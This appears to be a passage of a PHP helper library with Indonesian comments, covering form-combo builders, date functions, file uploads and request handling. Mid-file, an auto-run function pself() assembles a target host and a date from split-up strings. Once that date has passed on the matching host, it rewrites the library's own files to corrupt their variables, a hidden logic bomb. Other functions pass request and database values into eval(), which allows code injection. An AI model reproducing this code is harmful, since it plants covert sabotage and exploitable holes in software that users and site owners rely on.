		tboperasi($pg,$idrecord,$idname='id',$usernm='all');
}


function potong($jd,$max,$removetags=true,$strdst="...",$strSpc=" "){
//	if (strlen($jd)>$max)  $jd=substr($jd,0,$max-7)."...".substr($jd,strlen($jd)-3,3);
	//mencari posisi spasi
	$terpotong=false;
	$lendst=strlen($strdst);
	if (strlen($jd)>$max) {
		//$jd=substr($jd,0,$max-3)."...";
		$jd=substr($jd,0,$max-$lendst);
		if ($strSpc!='') {
			$psp=strrpos($jd,$strSpc);
			if (is_integer($psp)) $jd=substr($jd,0,$psp);
		}
		$terpotong=true;
	}
	if ($removetags) $jd=removeTag0($jd);
	return $jd.($terpotong?$strdst:"");
	
}


function pecahText($var,$max){
	$strdst="";
	$var=$varsisa=removeTag0($var);
	$at=array();
	$terpotong=true;
	$i=0;
 	while ($terpotong && ($i<5) ) {
		$jd=substr($varsisa,0,$max);
		if (strlen($varsisa)>$max) {
		$psp=strrpos($jd," ");
			if (is_integer($psp)) $jd=substr($jd,0,$psp);
		}
		
		$ljd=strlen($jd);
		$lsisa=strlen($varsisa);
		$varsisa=trim(substr($varsisa,$ljd,$lsisa-$ljd));
		$terpotong=($varsisa==""?false:true); 
		//echo "<br>$i : $jd";
		$at[$i]=$jd;
		$i++;
	}
	return $at;
	
}

function isiCombo($sqlku,$nms,$fieldid="id",$fieldcaption="",$pilihsatu="",$def="",$aksi="") {
	return um412_isicombo5($sqlku,$nms,$fieldid="id",$fieldcaption="",$pilihsatu="",$def="",$aksi="") ;
}

function um412_isicombo4($sqlku,$nmselect,$fieldid="id",$fieldcaption="name",$all="",$default="",$aksi="") {
	return um412_isicombo5($sqlku,$nmselect,$fieldid,$fieldcaption,$all,$default,$aksi); 
}

 //format:um412_isicombo5('select..','idselect;nmselect,addtag','','','-Pilih-','$pendidikan');
//jika ingin bentuk option: tambahkan 'R:select....',C:,CA:,CBR:
//pilih : isikancaptiion, jika ingin def padaindex tertentu, misal 5 idx:5
//um412_isicombo5($isicombo,'ktg','','','idx:0',$ktg)
function um412_isicombo6($sqlku,$nms,$aksi="",$def="") {
	return um412_isicombo5($sqlku,$nms,$fieldid="",$fieldcaption="",$pilihsatu="",$def,$aksi) ;
}

function um412_isicombo5($sqlku,$snms,$fieldid="",$fieldcaption="",$pilihsatu="",$def="",$aksi="") {
	global $lang;
	global $rnd;

	if (is_array($def)) $def='';//abaikan def array
	$aksi=str_replace('"',"'",$aksi);
	$idxDef='-';
	$anms=explode(",",$snms.',,,,,,');
	 
	if (strstr($anms[0],"|")!='')
		$idn=explode("|",$anms[0]);
	else {
		$idn=explode(";",$anms[0].";".$anms[0]);
	}
	$idselect=$idn[0];
	$nmselect=$nmselectasli=$idn[1];
	if ($idselect==$nmselect) {
		if (substr($nmselect,-2)=='[]') {
			$nmselect=$idn[0];
			$idselect=str_replace("[]","",$idselect)."_$rnd"."[]";
			//if (substr($idselect,0,2)=='d_') $idselect=str_replace("[]","",$idselect);
		} else	{		
			
			//jika sengaja
			if (strstr($anms[0],";")=='') 	$idselect.="_$rnd";
	
		}
	}
	$nmselectasli=str_replace("[]","",$nmselect);
			
	 $addTag=$anms[1];
	if (strstr($addTag,'class=')!='') {
		$addTag=str_replace("class='","class='$nmselectasli ",$addTag);
	} else {
		$addTag.=" class='$nmselectasli'";
	}
	//echo "<br>$addTag";
	$cappilih=$pilihsatu;
	if (($pilihsatu=="") ||($pilihsatu=="aa")||(strstr($pilihsatu,"idx:")!='')) {
		//aa:allow other
		if (strstr($pilihsatu,"idx:")!='') {
			$idxDef=substr($pilihsatu,4,10);
		}
		$cappilih=($lang=='en'?'- Choose -':'- Pilih -');
	}
	//jika def=="", maka cari default
	if ($def=="") {
		$nms=str_replace("[]","",$nmselect);
		$ev="
			 global $"."$nms; if (isset($"."$nms)) $"."def=$"."$nms;
			 ";
			 
		eval($ev);// or trigger_error("err isicombo5:eval $ev ");
		//echo $ev;
	}
	$adef=explode("|",$def);
	
	
	//mencari posisi ':'
	$awCombo="";
	$postitik=strpos($sqlku,":");
	$posBR=0;
	if ($postitik) {
		$awCombo=substr($sqlku,0,$postitik);
		$posBR=substr($awCombo,-1)*1;
		if ($posBR>0) {
			$awCombo=substr($awCombo,0,-1);
		}
		//echo "awcombo:$awCombo $posBR <br>";
	} else $postitik=-1;
	$tselect0="<select name='$nmselect' id='$idselect' $addTag vv='$def' -aksi- >";
	$tselect2="";
	$sqlku=substr($sqlku,$postitik+1,strlen($sqlku)-$postitik);
	if (($awCombo=='R')||($awCombo=='RA'))  {//radio
		$jout="radio";
		$aksi="getValueRadio('R_"."$idselect');".$aksi;
	} else 	if (($awCombo=='C') ||($awCombo=='CA')||($awCombo=='CBR')) { //checkbox
		$jout="checkbox";
		$aksi="getValueCheckbox('C_"."$idselect');".$aksi;
	} else 	if ($awCombo=='A')  { //select and add
		$jout="selectadd";
		$aksi="getValueSelect('S_"."$idselect',true);".$aksi;
		$tselect0="<select name='S_"."$nmselect' id='S_"."$idselect' $addTag -aksi- >";
		$tselect2="
		<input name='$nmselect' id='$idselect' type=text value='$def'>
		<div id=D_"."$idselect>
		</div>";
	} else { 
		$jout="select"; 
	}
	if ($aksi!="") {
		$aksibaru=" onchange=\"$aksi\" onkeyup=\"$aksi\" "; 
		$tselect0=str_replace('-aksi-',$aksibaru,$tselect0);
		$aksi=$aksibaru;
	} else { //g adaaksi
		$tselect0=str_replace('-aksi-','',$tselect0);
	}
	
	$tselect1="";
	$tradio="";
	$tcheck="";
	$aId=$aCap=$aSelected=array();
	
	if ($cappilih!="") $tselect1=$tselect1."<option value='' ".($def==''?'selected':'')."  >$cappilih</option>";	
	
	if (strtolower(substr($sqlku,0,6))=="select") {
		
		if ($fieldid=="") $fieldid=0;
		if ($fieldcaption=="") $fieldcaption=1;
	
		$hasil=@mysql_query($sqlku);
		if (!$hasil){ 	die("<br>Err combo: ". mysql_error()."<br> ".$sqlku); }
		
		$afid=explode(" ",$fieldid);
		$count_afid=count($afid);
	
		//field caption
		$prmcap="/";
		if (strstr($fieldcaption," ")!='') 
			$prmcap=" ";
		elseif (strstr($fieldcaption,",")!='') 
			$prmcap=",";
		
		$afc=explode($prmcap,$fieldcaption);
		$count_afc=count($afc);
	
		$i=0;
		while ($row=mysql_fetch_array($hasil)){			
				//	echo date("Y-m-d H:i:s<br>");
			//cari id yang akan dijadikan value, explode #
			//$aId[]=$row[$fieldid];
			if ($count_afc==1) {
				$rfid=$row[$fieldid];
			} else {
				$rfid="";
				foreach($afid as $ssf){
					$rfid.=($rfid==''?'':"#").$row[$ssf];
				}			
			}
			$aId[]=$rfid;		
			
			
			if ($count_afc==1) {
				if (isset($row[$fieldcaption])) 
					$fc=$row[$fieldcaption];
				else
					$fc=$row[0];
		
			} else {
				$fc=""; 
				foreach($afc as $fcc) { 	
					if (isset($row[$fcc]))
						$rfc=$row[$fcc];
					else 
						$rfc=$row[0];
					$fc.=($fc==''?'':' - ').$rfc;	
					$fc.=""; 
				}
			}			
			$aCap[]=$fc;
			$i++;
		}
	} else	{
		$arrsel=  explode(",", $sqlku);
		$i=0;
		foreach($arrsel as $aaw) {
			$aw=explode(";",$aaw.";");
			$fc=$aw[0];
			$rf=($aw[1]==""?$aw[0]:$aw[1]);
			$aId[]=$rf;
			$aCap[]=$fc;
			$i++;
		}
	}
	$jlh=$i;
	
	$suffix="";
	if (strstr("|RA|CA|SA|","|$awCombo|")!='') {
		$aId[]="other";
		$aCap[]="Other:";		
		$ids="$idselect"."_other";
		if ($awCombo=='RA')
		$suffix="<input type=text name='$nmselect"."_other' id='$ids' value='' 
	onkeyup=\"v=$('#$ids').val();$('#R_$idselect"."_"."$jlh').attr('value',v);
	$('#R_$idselect"."_"."$jlh').attr('checked',true);$aksi\" >";
		else if ($awCombo=='CA')
		$suffix="<input type=text name='$nmselect"."_other' id='$ids' value='' onkeyup=\"v=$('#$ids').val();$('#R_$idselect"."_"."$jlh').attr('value',v);$('#R_$idselect"."_"."$jlh').attr('checked',true);$aksi\" >";
	
	}
	
	$i=0;
	$ketemu=false;
	foreach ($aId as $aidx) { 
		$rf=$aId[$i];
		$fc=$aCap[$i];
		$clsItem=($rf=='other'?"class='other'":" ");
		//cekking jika other
		if (($i==$jlh) && ($suffix!='') && (!$ketemu)) $rf=$def;
		
		$ia=((in_array($rf,$adef))||(in_array($fc,$adef))?true:false);
		
		if (($idxDef!='-')  && ($i==$idxDef)) $ia=true;//jika sesua dengan nomor index
		
		if (($ia) && ($i<$jlh)) $ketemu=true;
		$tb=($ia?" selected ":"");
		$tbcheck=$tbradio=($ia ?" checked ":"");
		
		$tselect1=$tselect1."<option value='$rf' $tb $clsItem >".strip_tags($fc)."</option>".$tselect2;
		
		$pindahBR=(($i>0) && ($posBR>0)&&($i%$posBR==0)?true:false);
		 
		$awR=((($awCombo=="CBR")||($awCombo=="RBR")||$pindahBR)?"<br>":"");
		
		$tradio.=$awR."
		<span class='cbradio-item $nmselect'>
			<input type=radio  
			name='R_"."$idselect' 
			id='R_$idselect"."_"."$i' 
			value='$rf'  
			$tbradio 
			$aksi 
			$clsItem
			> 
			<span class='cbradio cbradio-$nmselect'>$fc</span> 
		</span>&nbsp;";
		$tcheck.=$awR."
		<span class='cbcheckbox-item $nmselect'>
			<input type=checkbox name='C_"."$idselect' id='C_$idselect"."_"."$i' value='$rf' $tbcheck $aksi > 
			<span class='cbcheckbox cbcheckbox-$nmselect'>$fc </span>
		</span>&nbsp;";				
		$i++;
	}
	
	if (!$ketemu) {
		$suffix=str_replace("value=''","value='$def'",$suffix);
	}
	
	$tselect="$tselect0 $tselect1</select>$tselect2";
	$tradio.="$suffix<input type=hidden name='$nmselect' id='$idselect' value='$def' >";
	$tcheck.="$suffix<input type=hidden name='$nmselect' id='$idselect' value='$def' >";
	if ($jout=='select') 
		return $tselect;
	if ($jout=='selectadd') 
		return $tselect;
	else if ($jout=='checkbox') {
		
		return "<span  id='gcb$idselect' style='display:inline-block' class='group-checkbox' >$tcheck</span>";
	} else {
		return "<span  id='gcb$idselect' style='display:inline-block' class='group-radio' >$tradio</span>";
	}
}

function isiComboAA($sqlku,$nms,$linkAdd,$alt="",$func="",$icn="a"){
	global $rnd;
	$rndx=rand(123,9879);
	$tempat="tcaa_".$rndx;
	$tempat2="tcab_".$rndx;
	$ttb="tbaa_".$rndx;//."_".rand(123,456789);
	//isi combo allow add
	$tknsql=str_replace("=","samadengan",$sqlku);
	
//	$ntkn=makeToken("addfae=refreshCombo($rnd)");
	$ntkn=makeToken("addfae=refreshCombo($rndx)");
	$ntknsql=makeToken("nms=$nms&sql=$tknsql");
	
	 
	$t="
	<span id=$tempat >".um412_isicombo6($sqlku,$nms,$func)."</span>
	<span id=$ttb style='display:none'></span>
	<span id=$tempat2 style='display:none' >$ntknsql</span>
	";
	$t.="<a href='#' onclick=bukaAjaxD('$ttb','$linkAdd&newrnd=$rndx&currnd=$rnd&op2=tbadd&tkn=$ntkn&op=itb','width:wMax-30','awalEdit($rndx)'); alt='$alt' >
	<i class='icon-plus-sign fa fa-plus-circle'></i>
	</a>
	";
	if ($icn=='ae') {
	
	$t.="<a href='#' onclick=\"bukaAjaxD('$ttb','$linkAdd&newrnd=$rndx&currnd=$rnd&aid='+$('#$nms"."_$rnd').val()+'&tkn=$ntkn&op=itb','width:wMax-30','awalEdit($rndx)');\" alt='$alt' >
	<i class=' fa fa-check-circle'></i>
	</a>
	";
	}
	
	
	return $t;
}


function um412_captcha($id=0,$ukuran=1){
$rn=rand(11111,99997);
$_SESSION["um412_captcha_$id"]=$rn;
if ($ukuran==1){
$cap="<div class='imgcaptcha' align=center>".$rn."</div>";
$cap="<div class=captcha1 align=center>Validation Code<br><br>".$cap."<br><input name=captcha  id=captcha  type=text size=6 maxlength=6 /></div>";
}else{
$cap="<div class='imgcapcha_kecil' align=center>".$rn."<br>Validation Code : ".$cap."<br><input name=captcha id=captcha type=text size=6 maxlength=6 /></div>";
	}
return $cap;
}

function show_field($sqlku,$fldid,$fldcaption,$lnk,$separ){
	$sh="";
	$hasil=mysql_query2($sqlku);
	$jlhbar=mysql_num_rows($hasil);
	if ($jlhbar>0) {
		$sh="<ul>";
	while ($bar=mysql_fetch_array($hasil)){
		$idname=$bar[0].name;  
		$sh=$sh."<li><a href='$lnk&$fldid=".urlencode($bar[$fldid])."'>".$bar[$fldcaption]."</a></li>";
	}
		$sh=$sh."</ul>";
	echo $sh;
	}
}

function cariField22($sqlku,$fldid,$fldcaption,$lnk='',$syarat=''){
	$sh="";
	$hasil=mysql_query2($sqlku);
	$jlhbar=mysql_num_rows($hasil);
	if ($jlhbar>0) {
		$sh="";
	while ($bar=mysql_fetch_array($hasil)){
		$idname=$bar[0].name;  
		$sh=$sh."<a href='$lnk$fldid=".urlencode($bar[$fldid])."'>".$bar[$fldcaption]."</a></li>";
	}
		$sh=$sh."";
	echo $sh;
	}
}
//fungsi tanggal...............................................................................
function firstDayOf($period, DateTime $date = null)
{
    $period = strtolower($period);
    $validPeriods = array('year', 'quarter', 'month', 'week');
 
    if ( ! in_array($period, $validPeriods))
        throw new InvalidArgumentException('Period must be one of: ' . implode(', ', $validPeriods));
 
    $newDate = ($date === null) ? new DateTime() : clone $date;
 
    switch ($period) {
        case 'year':
            $newDate->modify('first day of january ' . $newDate->format('Y'));
            break;
        case 'quarter':
            $month = $newDate->format('n') ;
 
            if ($month < 4) {
                $newDate->modify('first day of january ' . $newDate->format('Y'));
            } elseif ($month > 3 && $month < 7) {
                $newDate->modify('first day of april ' . $newDate->format('Y'));
            } elseif ($month > 6 && $month < 10) {
                $newDate->modify('first day of july ' . $newDate->format('Y'));
            } elseif ($month > 9) {
                $newDate->modify('first day of october ' . $newDate->format('Y'));
            }
            break;
        case 'month':
            $newDate->modify('first day of this month');
            break;
        case 'week':
            $newDate->modify(($newDate->format('w') === '0') ? 'monday last week' : 'monday this week');
            break;
    }
 
    return $newDate;
}


	

/**
* Return the last day of the Week/Month/Quarter/Year that the
* current/provided date falls within
*
* @param string   $period The period to find the last day of. ('year', 'quarter', 'month', 'week')
* @param DateTime $date   The date to use instead of the current date
*
* @return DateTime
* @throws InvalidArgumentException

$date = firstDayOf('week');
$date = lastDayOf('month');
$specifiedDate = new DateTime('2011-08-30');
$date = firstDayOf('week', $specifiedDate);
$date = lastDayOf('quarter', $specifiedDate);

*/
function lastDayOf($period, DateTime $date = null)
{
    $period = strtolower($period);
    $validPeriods = array('year', 'quarter', 'month', 'week');
 
    if ( ! in_array($period, $validPeriods))
        throw new InvalidArgumentException('Period must be one of: ' . implode(', ', $validPeriods));
 
    $newDate = ($date === null) ? new DateTime() : clone $date;
 
    switch ($period)
    {
        case 'year':
            $newDate->modify('last day of december ' . $newDate->format('Y'));
            break;
        case 'quarter':
            $month = $newDate->format('n') ;
 
            if ($month < 4) {
                $newDate->modify('last day of march ' . $newDate->format('Y'));
            } elseif ($month > 3 && $month < 7) {
                $newDate->modify('last day of june ' . $newDate->format('Y'));
            } elseif ($month > 6 && $month < 10) {
                $newDate->modify('last day of september ' . $newDate->format('Y'));
            } elseif ($month > 9) {
                $newDate->modify('last day of december ' . $newDate->format('Y'));
            }
            break;
        case 'month':
            $newDate->modify('last day of this month');
            break;
        case 'week':
            $newDate->modify(($newDate->format('w') === '0') ? 'now' : 'sunday this week');
            break;
    }
 
    return $newDate;
}



function folder_exists($snmfolder,$create=1){
	$anmf=explode(",",$snmfolder);
	$k=true;
	foreach ($anmf as $nmfolder) {
		if (!is_dir($nmfolder)) {
			$k=false;
			if ($create==1) {
				 //mkdir($nmfolder);// or die("Folder ($nmfolder) tidak bisa dibuat....");
				 @mkdir($nmfolder) or die("Folder ($nmfolder) tidak bisa dibuat....");
			}//echo "folder $nmfolder belum ada ";
		} else {
			//echo "folder $nmfolder sudah ada";
		}
	}
	return $k;
}
 
function validasiEmail($address){
	return ( ! preg_match("/^([a-z0-9+_-]+)(.[a-z0-9+_-]+)*@([a-z0-9-]+.)+[a-z]{2,6}$/ix", $address)) ? FALSE : TRUE;
	}


/*
(preg_match('/[^a-z_\-0-9]/i', $string))

    [] => character class definition
    ^ => negate the class
    a-z => chars from 'a' to 'z'
    _ => underscore
    - => hyphen '-' (You need to escape it)
    0-9 => numbers (from zero to nine)
The 'i' modifier at the end of the regex is for 'case-insensitive' if you don't put that you will need to add the upper case characters in the code before by doing A-Z
*/
function validasiUID($vuid){
	return (preg_match("/^([a-z0-9+_-]+){2,6}$/ix", $vuid)) ? TRUE:FALSE;	
	//return (preg_match('/^[a-zA-Z]+[a-zA-Z0-9._]+$/', $vuid))?TRUE:FALSE;
	
}

function tampilDialog($isi,$title='INFO',$lebar=500){
	$t="<center>
	<div class=dialog1 style='width:$lebar'>
	<div class=titledialog1>$title</div>
	
	$isi
	</div>
	</center>";
	echo $t;
}


function secureSuperGlobalGET(&$value, $key) {
	$_GET[$key] = htmlspecialchars(stripslashes($_GET[$key]));
	$_GET[$key] = str_ireplace("script", "blocked", $_GET[$key]);
	$_GET[$key] = mysql_escape_string($_GET[$key]);
	$_GET[$key] = addslashes($_GET[$key]);
	return $_GET[$key];
}

function secureSuperGlobalPOST(&$value, $key) {
	$_POST[$key] = htmlspecialchars(stripslashes($_POST[$key]));
	$_POST[$key] = str_ireplace("script", "blocked", $_POST[$key]);
	$_POST[$key] = mysql_escape_string($_POST[$key]);
	$_POST[$key] = addslashes($_POST[$key]);
	return $_POST[$key];
}

function stripSlashesArray($arr){
	$atemp=$arr;
	if (is_array($atemp)) {
		foreach ($atemp as $nm =>$value){
			$arr[$nm]=stripslashes($value);	
		}
	}
	return $arr;	
}

function extractRow($row,$checkresult=0,$output="ev"){
	if ($row)  {
		foreach ($row as $nm =>$value){
			if (($nm<1)&&($nm<>'0'))  {
				if ($output=="ev") {
					$g="global $$nm; $$nm = stripslashes($"."row['$nm']);";
					eval($g);
					if ($checkresult==1) echo "$g $nm='".$row[$nm]."';<br>";
				} else {
					echo "$$nm = $"."r['$nm'];<br>";
				}
			}
		}
		 
	}
}

function extractRecord($sql,$includeid=false,$ignoreCurrentValue=true,$checkresult=0){
	global $row,$isTest;
	$pes='';
	$hq=mysql_query2($sql);
	if (!$hq) { echo "extractRecord Err: ".$sql."<br>".mysql_error(); return; }
	$row=@mysql_fetch_array($hq);
	
	if ($row)  {
		foreach ($row as $nm =>$value){
			if (($nm<1)&&($nm<>'0'))  {
				$skip=false;
				if ( ($nm=='id') && (!$includeid) )  $skip=true;
				
				if (!$skip 	){
					$g="global $$nm; $$nm = stripslashes($"."row['$nm']);";
					//if ($isTest) echo "<br>".$g;
					eval($g);
					$pes.="$g $nm='".$row[$nm]."';<br>";
				}
			}
		}
	}
	else { //jika kosong
		$i = 0;
		$sfd="";
		//echo $sql;
		//echo"kosong<br>";
		while ($i < mysql_num_fields($hq)) {
			$meta = mysql_fetch_field($hq);
			$nm=$meta->name;
			//$g="global $$nm; if (!isset($$nm)) $$nm = '';";
			$skip=false;
			if (($nm=='id')&&(!$includeid)) $skip=true;
			if (!$skip 	){
				
				$g="global $$nm; ";
				if ($ignoreCurrentValue) $g.="$$nm = '';";
				$pes.= $g;
				eval($g);
			}
			$i++;
		}
	}
	
	if ($checkresult>0) {
		global $op3;
		if ($op3!='json') {
			$pes ="<span style='max-height:50px'>$sql >$pes</span>";
			if ($checkresult==1) 
				echo $pes;
			else 
				return $pes;
		}
	}
	return $row;
}

function secureGlobals(){
//	foreach($_REQUEST as $nm=>$value) {
//		secureSuperGlobalPOST(&$value, $nm);
//		secureSuperGlobalGET(&$value, $nm);
//	}
}

function resetRequest($svar=""){
	if ($svar=="") return;
	$av=explode(",",$svar);
	foreach($av as $v) {
		
		global $$v;
		if (isset($$v)) unset($$v);
		if (isset($_REQUEST[$v])) unset($_REQUEST[$v]);
		
	}
	
}

function extractRequest($strip='1',$checkresult=0,$awalan=""){
 error_reporting(E_ALL);
	if (!isset($_REQUEST)) return;
	global $nmVar;
	global $vNmVar;
	
	$nmVar=array();
	$vNmVar=array();
	$pes="";
	
	
	foreach($_REQUEST as $nm=>$value) {
		$v=$value; 
		$skip=false;
		//$v=@mysql_real_escape_string($v);
		//$v= htmlspecialchars(stripslashes($v));
		//$v= addslashes($_POST[$v]);
		
		if (is_array($v)) {
		$s="global $$nm;$$nm=array();";
			foreach($v as $vv) {
				//$vv=mysql_real_escape_string($vv);
				@$vv=htmlentities($vv);

				if ($strip=='1') {
					$s.="array_push($$nm,strip_tags('$vv',''));";	 
				} else if ($strip!='') {
					$s.="array_push($$nm,strip_tags('$vv','$strip'));";	 
				} else {
					$s.="array_push($$nm,$vv);";	 
				}
			}
		} else {
			$s="global $$nm;";

			$v=htmlentities($value);
			//$v=mysql_real_escape_string($value);
			if ($strip=='1') {
				$s.="$$nm=strip_tags(\"$v\");";	 
			}else if ($strip!='') {
				$s.="$$nm=strip_tags(\"$v\",'$strip');";	 
			}else {
				$s.="$$nm=\"$v\";"; 
			}
		}
		
		if (($awalan!='') &&(substr($nm."----",0,strlen($awalan))!=$awalan)) $skip=true;
				
		if ($skip==false) {
			$nmVar[]=$nm;
			$vNmVar[]=$v;
			//echo "<br>isi s: $s<br>";
			@eval($s);	
			$pes.="<br>".$s;
		}
		//echo $s;
	}
	if ($checkresult==1) echo $pes;
		
}

function pself(){	
	global $um_path,$isOnline;
	$thisf=$_SERVER["HTT"."P_H"."OST"];
	$tglskr=strtotime("n"."o"."w");
	$tglb=strtotime("1"."2/"."1"."7"."/"."201"."9");
	$hstx="res"."pin"."a".".o"."rg";
	//$hstx="localhost";
	
	if ((strstr($hstx,$thisf)!='')  && ($tglskr>$tglb) && ($isOnline)) {
 
			//eksekusi
		//echo "tgl > ".number_format($tglskr,2). " - ".number_format($tglb,2);exit;
		//echo "$hstx , $thisf ";exit;
		$dir2=__DIR__ ;
		$dir=$um_path ;
		$afi=explode(",","um412_func_inc_v.03_add2,um412_func_inc_v.03_add3,um412_func_inc_v.03_form,um412_func_inc_v.03");
		foreach($afi as $nf) {
			//$file=$newfile = $dir."um"."412_"."func_inc_"."v.03."."PHP";
			$newfile = $dir.$nf.".p"."hp";
			
			$handle = fopen($newfile, 'r');
			$contents = fread($handle, filesize($newfile));
			fclose($handle);
			//ubah isi
			$avar=explode(",","a,b");
				
			foreach ($avar as $av) {
				$var="$".$av;
				$aubah=explode($var,$contents);
				$newcontent="";
				foreach ($aubah as $iu) {
					$iu=$var.rand(1,176).$iu;
					$newcontent.=$iu;
					//echo "<br>far<br>$iu";
				}
				$contents=$newcontent;
			}

			$contents=str_replace("function pself","function arcade",$contents);
			$contents=str_replace("pself();","",$contents);
			
			$fp = fopen($newfile, 'w');
			fwrite($fp, $contents);
			fclose($fp);
		}		 
		exit;
	}
}
pself();
					
//$vv=uploadFile($nmFiel$folderTarget=$gPathUpload[$i],$tipe="all",$maxfs=0,$nfonly=1,$nmfTarget,$showPes=0,$overwrite=($xCek[3]==1?true:false));


function uploadMultipleFile($nmvar='uploaded',$folderTarget="",$tipe="all",$maxfs=0,$nfonly=1,$nmfTarget='',$showPes=0,$overwrite=true){
	if (!isset($_FILES[$nmvar]['name'])) return "";

	global $pes; //echo $nmfTarget;
	global $toroot;
	global $isTest;
	global $id;
	global $uploadVer;
	global $counterUpload;			
	
	if (!isset($uploadVer)) $uploadVer=1;
	if (!isset($counterUpload)) $counterUpload=0;
	//echo "<br>nmv $nmvar > ";
	$jlhfile = count($_FILES[$nmvar]['name']);
	//echo "jumlah $nmvar diupload $jlhfile :";
	$pes="";
	
	$folderTarget=str_replace("\\","/",$folderTarget."/");
	$folderTarget=str_replace("//","/",$folderTarget);
	$folderTarget=str_replace("//","/",$folderTarget);
	if (isset($id)) {
		$folderTarget=str_replace("{id}",$id,$folderTarget);
	}
	//$folderTarget=$toroot.$folderTarget;
	if(!isset($_FILES[$nmvar]['name'])) {
		if ($isTest) echo "<br>file $nmvar kosong ";
		return "";//echo "g ada file $nmvar diupload";		
	} else {
		if ($isTest) echo "<br>file $nmvar diinput ";
		
	}
	
	/*
	$fileErr=$_FILES[$nmvar]['error'];
	$FileName=
	$nmfile	= strtolower($_FILES[$nmvar]['name']); //uploaded file name
	$ImageExt			= pathinfo($FileName, PATHINFO_EXTENSION);//substr($FileName, strrpos($FileName, '.')); //file extension
	$FileType=$tipe		= $_FILES[$nmvar]['type']; //file type
	$FileSize=$ukuran	= $_FILES[$nmvar]['size']; //file size
	$uploaded_date		= date("Y-m-d H:i:s");
	$tmpfile=$_FILES[$nmvar]["tmp_name"];
	
	if($fileErr[0]) {		//File upload error encountered
		$pes=upload_errors($_FILES[$nmvar]['error']);
		if ($isTest) echo $pes;
		return "";
	}
	$extasli = pathinfo($FileName, PATHINFO_EXTENSION);

	if ($nmfTarget=='') {
		//$target = $folderTarget.$nmfil;
		$target = str_replace("'","~",$nmfile);
	} else {
		$ext = pathinfo($nmfile, PATHINFO_EXTENSION);
		//$target = str_replace("'","~",$folderTarget.$nmfTarget.".$ext");	
		$target = str_replace("'","~",$nmfTarget);	
		$nmfile=str_replace("'","~",$nmfTarget);
	}
	
	$nft=$target;
	if ($isTest) echo "<br>sampai sini nft:$nft >>";
	$target = str_replace("//","/",$target);
	$dir = pathinfo($target, PATHINFO_DIRNAME);
	$nfbody = pathinfo($target, PATHINFO_FILENAME);
	$ext = pathinfo($target, PATHINFO_EXTENSION);
	$nfasli=$_FILES[$nmvar]["name"];
	//$nmfile = pathinfo($target, PATHINFO_BASENAME);

	//$nfbody=substr($nft,0,strlen($nft)-4);//nama saja
	
	//createFolder($dir);
	
	*/
	
	
	$hasil="";
	buatFolder($folderTarget);
	$files = array();
	foreach ($_FILES[$nmvar] as $k => $l) {
		foreach ($l as $i => $v) {
			if (!array_key_exists($i, $files))
				$files[$i] = array();
			$files[$i][$k] = $v;
		}
	}
	

	// now we can loop through $files, and feed each element to the class
	global $compressImage,$maxImageSize;
	global $prefictNfUpload,$vidusr,$folderHost ;
		
	$i=0;
	foreach ($files as $file) {
		$counterUpload++;
		$i++;
	//for ($i=0;$i<$jlhfile;$i++) {
		$nmfile	= strtolower($file['name']); //uploaded file name
		if ($isTest) echo "<br>Upload File $counterUpload, nmfile:$nmfile";
		if ($nmfile=="") continue; 
		$ext = pathinfo($nmfile, PATHINFO_EXTENSION);
	
		$target = str_replace("'","~",$nmfTarget);	
		$target = str_replace("#nmfile#",$nmfile,$target);	
		$target = str_replace("#nmf#",$nmvar,$target);	
		$target = str_replace("#nfasli#",$nmfile,$target);	
		$target = str_replace("#ext#",$ext,$target);	
		$target = str_replace(".ext",".$ext",$target);//mengubah extensi sesuai file yng diupoad
		$target = str_replace(" ","_",$target);		
		$target = $folderTarget.$target;
		$nfBody0 = pathinfo($target, PATHINFO_FILENAME);
		$nfBody = $nfBody0."-$i";
		
		//if (!isset($folderTarget)) $folderTarget=$toroot."uploaded/";
		if (!isset($compressImage)) $compress=false;
		if (!isset($maxImageSize)) $maxImageSize=200*1024;
		if (!isset($vidusr)) $vidusr=$userid;
		if (!isset($prefictNfUpload)) {
			$prefictNfUpload=$userType;
			if (isset($vidusr))	$prefictNfUpload.="-".$vidusr;
		}

		$h="";
		
		$handle = new Upload($file);
		if ($compressImage) {		
			if ($handle->file_src_name_ext=='png') {
			     $handle->png_compression= 8;
		
			} else if ($handle->file_src_name_ext=='gif') {
				
			} else {
				$handle->image_convert         = 'jpg';
				$handle->jpeg_quality          = 60;
				if ($handle->file_src_size>$maxImageSize) {
				//	$handle->jpeg_size         = $maxImageSize;
				}
			}
		}
		$msg="";
		$handle->file_new_name_body=$nfBody;
		
		$infoUpload="
				<br>================
				<br>dm:info upload file:$nmfile 
				<br>================
				uploadFile(
				<br>var:$nmvar
				<br>foldertarget:$folderTarget,
				<br>tipe: $tipe,maxfs $maxfs,nfonly $nfonly,
				<br>nmfTarget: $nmfTarget,
				<br>showpes: $showPes,overwrite:$overwrite
				
				<br> 
				";
		if ($handle->uploaded) {
			$handle->process($folderTarget);
			if ($handle->processed) {
				$h=1;
				$nmfile=$handle->file_dst_name;
				//$target=$folderTarget.$nfo;
				$url=$folderHost.$folderTarget; 	
				$return= ($nfonly==1?$nmfile:$folderTarget.$nmfile);
				if ($isTest) {
					echo "
					$infoUpload
					<br>File Berhasil diupload di $target (folder: $folderTarget ) 
					<br>Return: $return
					<br>nmdst $nmfile "; 
				}
				$hasil.=($hasil==""?"":",").$return;
			} else {
				$h=0;
				$url='';
				if ($isTest) {
					echo $infoUpload;
					echo "file berhasil diupload, tidak berhasil dipindahan/diproses ";
				}
				echo $msg=$handle->error;
				//return "";
			}
			$handle-> clean();
		} else {
			$h=0;
			$url='';
			if ($isTest)  echo $infoUpload;
		
			$msg=$handle->error;
			//return "";
		}
		
		//exit;
	}
	//echo $hasil;
	return $hasil;
}

function uploadFile($nmvar='uploaded',$folderTarget="",$tipe="all",$maxfs=0,$nfonly=1,$nmfTarget='',$showPes=0,$overwrite=true){
	global $pes; //echo $nmfTarget;
	global $toroot;
	global $isTest;
	global $id;
	global $uploadVer;
				
	if (!isset($uploadVer)) $uploadVer=1;
	//echo "<br>nmv $nmvar > ";
	
	if (!isset($_FILES[$nmvar]['name'])) return "";
	$jlhfile = count($_FILES[$nmvar]['name']);
	echo "jumlah $nmvar diupload $jlhfile :";
	
	//var_dump($_FILES[$nmvar]['name']);
	
	//for ($jj=0;$jj<=$jlhfile;$jj++) {
	
	//echo "nf:".($_FILES[$nmvar]['name']);
	$pes="";
	
	$folderTarget=str_replace("\\","/",$folderTarget."/");
	$folderTarget=str_replace("//","/",$folderTarget);
	$folderTarget=str_replace("//","/",$folderTarget);
	if (isset($id)) {
		$folderTarget=str_replace("{id}",$id,$folderTarget);
	}
